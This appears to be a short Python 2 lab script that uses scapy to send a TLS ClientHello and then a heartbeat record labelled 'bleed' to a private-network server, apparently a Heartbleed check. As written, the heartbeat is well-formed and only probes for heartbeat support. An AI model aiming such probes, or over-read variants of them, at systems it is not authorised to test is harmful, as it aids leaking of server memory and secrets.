import scapy.all
from scapy.layers.ssl_tls import *
import socket

target = ('192.168.140.136', 443)

# create tcp socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(target)
p = TLSRecord(version="TLS_1_1")/TLSHandshake()/TLSClientHello(version="TLS_1_1")
s.sendall(str(p))
s.recv(8192)
p = TLSRecord(version="TLS_1_1")/TLSHeartBeat(length=5, data='bleed')
s.sendall(str(p))
resp = s.recv(8192)
print "resp: %s" % repr(resp)
s.close()
